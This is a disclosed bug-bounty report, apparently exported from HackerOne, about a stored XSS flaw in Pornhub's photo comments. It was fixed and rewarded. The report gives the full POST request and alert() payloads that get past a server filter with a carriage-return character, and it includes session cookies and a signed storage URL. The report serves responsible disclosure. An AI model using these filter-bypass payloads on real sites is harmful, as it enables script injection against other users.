{"id":172227,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzIyMjc=","url":"https://hackerone.com/reports/172227","title":"Stored XSS in photo comment functionality","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2016-09-26T20:01:19.135Z","submitted_at":"2016-09-26T20:01:19.135Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"dudez","url":"/dudez","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/045/190/ef69905731aa6438fa893e62419ece0a283f890c_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":952,"url":"https://hackerone.com/pornhub","handle":"pornhub","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/952/77ffeabeff6e89172004356249a1de19b6a45424_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/952/77ffeabeff6e89172004356249a1de19b6a45424_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Pornhub","twitter_handle":"Pornhub","website":"https://pornhub.com","about":"The premiere destination for adult entertainment"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-10-12T19:09:44.673Z","bug_reporter_agreed_on_going_public_at":"2018-09-12T19:09:35.043Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"The photo comment functionality is vulnerable to stored cross site scripting: an attacker can craft a comment that contains malicious code and get it stored.\n\nThis can be reproduced on my test account at [http://www.pornhub.com/photo/166952961](http://www.pornhub.com/photo/166952961).\nInterestingly, differently from #171901 where i could bypass the server filter with the line-feed `%0a` character, the carriage-return `%0d` had to be used here instead.\n\nThe following is the POST request i used to store the malicious comment:\n\n```\nPOST /comment/add?id=166952961\u0026type=AlbumPhoto\u0026identifier=166952961\u0026hash=c7fda96cbfcf4b5affb09ef4bd90d7fd\u0026key=1474918020 HTTP/1.1\nHost: www.pornhub.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nReferer: http://www.pornhub.com/photo/166952961\nContent-Length: 41\nCookie: platform=pc; userSession=407qsn2v5ousdd10f7jqg7p87x5i9h5z; gateway=203930563; gateway_security_key=6dddff1c09f20684dd776a404ffdd121; expiredEnterModalShown=1; expiredEnterModalShown_security_key=0bddb66fa85f5b04e1965b8789b44432; _ga=GA1.2.456715002.1474825283; __atuvc=103%7C39; performance_timing=photo; RNLBSERVERID=ded6094; __atuvs=57e96976565b252b024; _gat=1\nConnection: close\n\ncomment=Hello!\u003c%0dsvg/onload=alert(1337)\u003e\n```\n\nI'm attaching a video for more evidence.","bounty_amount":"1500.0","formatted_bounty":"$1,500","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":123203,"file_name":"stored-xss-photo-comments.webm","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/123/203/456b45c5d29f21e2ab678769d9be6015579671a1/stored-xss-photo-comments.webm?response-content-disposition=attachment%3B%20filename%3D%22stored-xss-photo-comments.webm%22%3B%20filename%2A%3DUTF-8%27%27stored-xss-photo-comments.webm\u0026response-content-type=video%2Fwebm\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T135127Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEfiwE8ABftQ4ZDSo2PcCdmgWGJAVhZBcjrVILPjej50AiACAJuLWZpiOUokpZpZYio1aaS1zedU6yBiP02ueFvn1iqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMwnKCmy9PUlqhlDykKtcDeye%2FigxH7oQuBLWPNAddVUxCetP%2B6VM%2FIfdoNEAf8dePeEZ6nfGVUDz0owpAQ8YnLRTgfKqbZIg9uvHiJY%2F4BbcoCSwwJdRGPldLb3Y3WlPcJ1JvXUEefleLwhstFskHZ2cPwg1VDGmKUpYSrXj0yczI934c5Lp8FHGi7k73DEu%2FAkrDbRnSZHG42WaaqPNNWImCdPeTEmq3NWpEt8cesOA6Xa4VqYMRs9drBzvQOySUd6OOKhFszrFCIooeL9FH3tfL1jRUt27tojJhfuYEL1%2BXkCSnEkXAKcWclEQwC3FfnY0XhghLZDzab25hU%2Bd2h1mXTSBw8U0KUeuS7BYp2gJWFyuMnua0PPwpsnfW%2B9HdmkGFEZMkcwfZlh9E6l1XmyYfjTKzbK4akQ37CPeaxglSuydRq%2BOr7eoa4bJwD8SbBbqyaFHvzfbmsQAD6vBhy3a3VJ%2FRjznM9l%2FDW%2BnlGoCNLaIcQRZvZ0zDR6x%2ByF%2BOA4LXd0zzf8we7BSGFKyQfoRnsOQpRday7KSiYLmMmNfRdBrUHLRHvgeo%2BpRsKlDHGprEYxVC9m%2FkU3USyz305DDgoYfE7CyGX%2FKauSdBx1ZrMRAhyMPdXtfyvzVr4uFs8EB9pzBTMM%2F%2FkIsGOqYBpHeiPK1x0yJBNNgdNDNHwOZb44D7QldQoMShvupPsVW7xgZ9egfooN5Hr7L7zQT0se6VW6MDEHSuh790gIEL3N2l3o4i8vRIQjRoeoSklFrZONuWaRaLdV2EJtaDDZ%2BwBg0kYTnQOYCaI2vJ3EB7BWjw1JRVBpZH6NvHFfING%2B%2Bhp9nGXAhqXdBxPezBeHqUbpMsZkRZrmnH1UVt5up6rjaXPnhY6Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=386bd392f63fbc477c070ef267d0c87280b38dec4e5deec50c39fec57e098c9d","file_size":5710240,"type":"video/webm"}],"allow_singular_disclosure_at":"2018-10-12T19:09:35.149Z","allow_singular_disclosure_after":-94588912.3106368,"singular_disclosure_allowed":true,"vote_count":44,"voters":["sp1d3rs","bl4de","zlz","sameerphad72","miguel_santareno","vp40","ali","ahiezer","ahmedehane","asad0x01_","and 34 more..."],"severity":{"rating":"high","score":7.6,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"required","scope":"changed","confidentiality":"high","integrity":"low","availability":"none"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1217149,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Also, the payload `comment=Hello!\u003c%0dscript\u003ealert(1337)\u003c/script\u003e` may be used to have it to fire also in Webkit-based browsers.","automated_response":false,"created_at":"2016-09-26T20:14:00.499Z","updated_at":"2016-09-26T20:14:00.499Z","actor":{"username":"dudez","cleared":true,"url":"/dudez","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/045/190/ef69905731aa6438fa893e62419ece0a283f890c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"pornhub","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1217252,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks for your report. We'll investigate the issue internally and get back to you in the next days.\n","automated_response":false,"created_at":"2016-09-26T20:40:56.354Z","updated_at":"2016-09-26T20:40:56.354Z","actor":{"username":"nastynick","cleared":false,"url":"/nastynick","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/089/985/cd57fcf5f45fdddd541e0ca1a1219052e50028d1_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"pornhub","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1217260,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ok! Also at your request I have now deleted the POC.","automated_response":false,"created_at":"2016-09-26T20:43:15.845Z","updated_at":"2016-09-26T20:51:41.579Z","actor":{"username":"dudez","cleared":true,"url":"/dudez","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/045/190/ef69905731aa6438fa893e62419ece0a283f890c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"pornhub","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1222127,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"As per @dudez, the behavior was also observed in the video and playlist comments as well.","automated_response":false,"created_at":"2016-09-28T19:11:12.682Z","updated_at":"2016-09-28T19:11:12.682Z","actor":{"username":"jsacks","cleared":false,"url":"/jsacks","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/032/836/f0af647bfa82105c5663ed0feb9d1d6dae1eec8b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"pornhub","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1267180,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @jsacks, i was retesting this and noticed it seems fixed on both photos, videos and playlists items, since i cannot reproduce it anymore: also, other similar techniques don't work as well, good work!","automated_response":false,"created_at":"2016-10-25T19:13:00.222Z","updated_at":"2016-10-25T19:13:00.222Z","actor":{"username":"dudez","cleared":true,"url":"/dudez","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/045/190/ef69905731aa6438fa893e62419ece0a283f890c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"pornhub","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1267369,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2016-10-25T20:07:32.346Z","updated_at":"2016-10-25T20:07:32.346Z","additional_data":{"old_severity":null,"new_severity":"High (7.6)","old_severity_id":null,"new_severity_id":4188},"actor":{"username":"dudez","cleared":true,"url":"/dudez","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/045/190/ef69905731aa6438fa893e62419ece0a283f890c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"pornhub","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1297088,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Any news on this one? It looks like it has been fixed already.","automated_response":false,"created_at":"2016-11-13T17:01:50.447Z","updated_at":"2016-11-13T17:01:50.447Z","actor":{"username":"dudez","cleared":true,"url":"/dudez","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/045/190/ef69905731aa6438fa893e62419ece0a283f890c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"pornhub","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1299208,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2016-11-14T20:57:52.786Z","updated_at":"2016-11-14T20:57:52.786Z","actor":{"url":"/pornhub","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/952/77ffeabeff6e89172004356249a1de19b6a45424_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Pornhub"}},"bounty_amount":"1500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"pornhub","collaborator":{"username":"dudez","url":"/dudez"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1299393,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Wow! Thanks for the bounty guys, much appreciated! Are you fine with public disclosure?","automated_response":false,"created_at":"2016-11-14T22:13:18.193Z","updated_at":"2016-11-14T22:13:18.193Z","actor":{"username":"dudez","cleared":true,"url":"/dudez","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/045/190/ef69905731aa6438fa893e62419ece0a283f890c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"pornhub","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1300420,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"At the moment this bug is still triaged and not resolved. I believe we had fixed it but there was a regression. Once the ticket is resolved you may request public disclosure. Thank you for your patience.","automated_response":false,"created_at":"2016-11-15T14:38:25.275Z","updated_at":"2016-11-15T14:38:25.275Z","actor":{"username":"jsacks","cleared":false,"url":"/jsacks","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/032/836/f0af647bfa82105c5663ed0feb9d1d6dae1eec8b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"pornhub","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1300848,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for the update, no problem from my part, just let me know if you need me to check it again when you are ready.","automated_response":false,"created_at":"2016-11-15T18:42:38.786Z","updated_at":"2016-11-15T18:42:38.786Z","actor":{"username":"dudez","cleared":true,"url":"/dudez","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/045/190/ef69905731aa6438fa893e62419ece0a283f890c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"pornhub","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1313567,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Issue's fixed on live, closing as Resolved.\n\nThanks for your report!","automated_response":false,"created_at":"2016-11-22T19:46:09.027Z","updated_at":"2016-11-22T19:46:09.027Z","actor":{"username":"dsimmons","cleared":false,"url":"/dsimmons","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"dudez","url":"/dudez"},"genius_execution_id":null,"team_handle":"pornhub","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1318329,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I forgot to ask, am i eligible for the swag?","automated_response":false,"created_at":"2016-11-24T20:18:11.414Z","updated_at":"2016-11-24T20:18:11.414Z","actor":{"username":"dudez","cleared":true,"url":"/dudez","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/045/190/ef69905731aa6438fa893e62419ece0a283f890c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"pornhub","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1319215,"is_internal":false,"editable":false,"type":"Activities::SwagAwarded","message":"","automated_response":false,"created_at":"2016-11-25T15:35:53.341Z","updated_at":"2016-11-25T15:35:53.341Z","actor":{"url":"/pornhub","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/952/77ffeabeff6e89172004356249a1de19b6a45424_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Pornhub"}},"reporter":{"username":"dudez","url":"/dudez"},"genius_execution_id":null,"team_handle":"pornhub","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1319216,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks much, really appreciated!","automated_response":false,"created_at":"2016-11-25T15:36:41.609Z","updated_at":"2016-11-25T15:36:41.609Z","actor":{"username":"dudez","cleared":true,"url":"/dudez","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/045/190/ef69905731aa6438fa893e62419ece0a283f890c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"pornhub","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3329728,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Are you ok with public disclosure on this?","automated_response":false,"created_at":"2018-09-12T19:09:35.103Z","updated_at":"2018-09-12T19:09:35.103Z","first_to_agree":true,"actor":{"username":"dudez","cleared":true,"url":"/dudez","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/045/190/ef69905731aa6438fa893e62419ece0a283f890c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"pornhub","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3472445,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2018-10-12T19:09:44.696Z","updated_at":"2018-10-12T19:09:44.696Z","actor":{"url":"/pornhub","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/952/77ffeabeff6e89172004356249a1de19b6a45424_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Pornhub"}},"genius_execution_id":null,"team_handle":"pornhub","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":19348,"category":"team","content":"The researcher managed to gain arbitrary javascript code execution (Stored XSS) using specially crafted comments posted on users' pictures.","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":713486,"username":"kjordan","name":"Kathleen Jordan","bio":"","cleared":false,"website":null,"location":"","created_at":"2019-08-19T18:47:16.841Z","url":"https://hackerone.com/kjordan","anc_triager":false,"hackerone_triager":false,"hackerone_employee":null,"user_type":"hacker","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/Jbs74PVSKHiCX5fwgny5RWTz/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/Jbs74PVSKHiCX5fwgny5RWTz/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://hackerone.com/rails/active_storage/representations/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBeG1yQ1E9PSIsImV4cCI6bnVsbCwicHVyIjoiYmxvYl9pZCJ9fQ==--4ac52d2c044d88368d89e4de17a14032af990508/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdCam9MY21WemFYcGxTU0lOTWpZd2VESTJNRDRHT2daRlZBPT0iLCJleHAiOm51bGwsInB1ciI6InZhcmlhdGlvbiJ9fQ==--7e37b612eb3c91a96f98ad01ca9fbe53cab870dd/images.jfif"}}},{"category":"researcher","can_view?":true,"can_create?":false}]}